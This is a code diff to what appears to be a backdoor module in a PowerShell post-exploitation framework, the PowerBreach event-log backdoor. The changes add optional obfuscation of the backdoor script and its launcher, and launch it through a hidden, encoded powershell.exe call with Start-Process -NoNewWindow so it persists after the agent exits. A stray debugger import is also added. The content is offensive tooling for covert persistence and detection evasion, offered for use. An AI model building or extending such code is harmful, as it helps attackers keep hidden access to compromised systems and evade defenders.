@@ -1,5 +1,6 @@
 import os
 from lib.common import helpers
+import pdb
 
 class Module:
 
@@ -76,7 +77,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         script = """
 function Invoke-EventLogBackdoor
@@ -123,7 +124,7 @@ Invoke-EventLogBackdoor"""
 
         else:
             # set the listener value for the launcher
-            stager = self.mainMenu.stagers.stagers["launcher"]
+            stager = self.mainMenu.stagers.stagers["multi/launcher"]
             stager.options['Listener']['Value'] = listenerName
             stager.options['Base64']['Value'] = "False"
 
@@ -158,14 +159,19 @@ Invoke-EventLogBackdoor"""
             print helpers.color("[+] PowerBreach deaduser backdoor written to " + outFile)
             return ""
 
+        if obfuscate:
+            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
         # transform the backdoor into something launched by powershell.exe
         # so it survives the agent exiting  
-        launcher = helpers.powershell_launcher(script) 
+        modifiable_launcher = "powershell.exe -noP -sta -w 1 -enc "
+        launcher = helpers.powershell_launcher(script, modifiable_launcher)
         stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
         parts = stagerCode.split(" ")
 
         # set up the start-process command so no new windows appears
         scriptLauncher = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-EventLogBackdoor started'" % (parts[0], " ".join(parts[1:]))
+        if obfuscate:
+            scriptLauncher = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptLauncher, obfuscationCommand=obfuscationCommand)
 
         print scriptLauncher
         
